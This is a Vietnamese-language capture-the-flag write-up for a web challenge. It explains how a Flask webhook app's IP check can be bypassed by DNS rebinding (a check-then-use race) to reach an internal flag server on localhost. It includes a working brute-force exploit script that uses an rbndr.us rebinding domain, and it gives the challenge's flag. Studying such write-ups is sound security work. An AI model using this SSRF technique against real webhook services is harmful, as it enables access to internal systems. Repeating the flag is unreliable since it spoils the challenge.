# Webhook as a Service - DNS Rebinding

## Challenge

- **URL**: `http://chall.0xfun.org:46473/`
- **Category**: Web
- **Flag**: `0xfun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}`

## Phân tích source code

App Flask chạy trên port 5000, đồng thời khởi chạy một **HTTP server nội bộ** trên `127.0.0.1:5001` trả flag khi nhận `POST /flag`.

```python
threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()
```

Hai endpoint chính:

- **`/register`** — đăng ký webhook URL, kiểm tra IP qua `is_ip_allowed()`
- **`/trigger`** — gọi lại webhook đã đăng ký, kiểm tra IP **lần nữa** rồi mới `requests.post(url)`

Hàm `is_ip_allowed()` dùng `socket.gethostbyname()` resolve DNS và chặn mọi IP `private/loopback/link_local/reserved`:

```python
def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None
```

## Lỗ hổng: DNS Rebinding (TOCTOU)

Trong `/trigger`, có **2 lần resolve DNS**:

1. `is_ip_allowed(url)` → `socket.gethostbyname()` — kiểm tra
2. `requests.post(url)` → resolve DNS lần nữa — thực thi

```python
@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    ...
    allowed, reason = is_ip_allowed(url)   # <-- resolve lần 1
    if not allowed:
        return jsonify({'error': reason}), 400
    resp = requests.post(url, ...)          # <-- resolve lần 2
```

Giữa 2 lần resolve này, nếu DNS trả về IP khác nhau → bypass được check.

## Khai thác

Sử dụng [rbndr.us](https://lock.cmpxchg8b.com/rebinder.html) — dịch vụ DNS rebinding, domain `7f000001.8efab5ae.rbndr.us` sẽ **ngẫu nhiên** trả về một trong hai IP:

- `127.0.0.1` (7f000001) — loopback
- `142.250.181.174` (8efab5ae) — IP public

Kịch bản thành công:

1. **Register**: DNS → IP public → pass `is_ip_allowed` → lưu webhook
2. **Trigger**:
   - `is_ip_allowed()` resolve → IP public → pass check
   - `requests.post()` resolve → `127.0.0.1` → gửi POST đến `127.0.0.1:5001/flag` → **nhận flag**

Do DNS random nên cần brute-force nhiều lần cho đến khi timing đúng.

## Script exploit

```python
import requests, sys

TARGET = 'http://chall.0xfun.org:46473'
# 7f000001 = 127.0.0.1, 8efab5ae = 142.250.181.174 (public)
REBIND_DOMAIN = '7f000001.8efab5ae.rbndr.us'
WEBHOOK_URL = f'http://{REBIND_DOMAIN}:5001/flag'

for attempt in range(300):
    try:
        r = requests.post(f'{TARGET}/register', data={'url': WEBHOOK_URL}, timeout=5)
        if r.status_code != 200:
            continue
        webhook_id = r.json()['id']
    except:
        continue

    for t in range(20):
        try:
            r2 = requests.post(f'{TARGET}/trigger', data={'id': webhook_id}, timeout=5)
            body = r2.text
            if '0xfun' in body:
                print(f'FLAG: {body}')
                sys.exit(0)
        except:
            pass
```

## Flag

```
0xfun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}
```
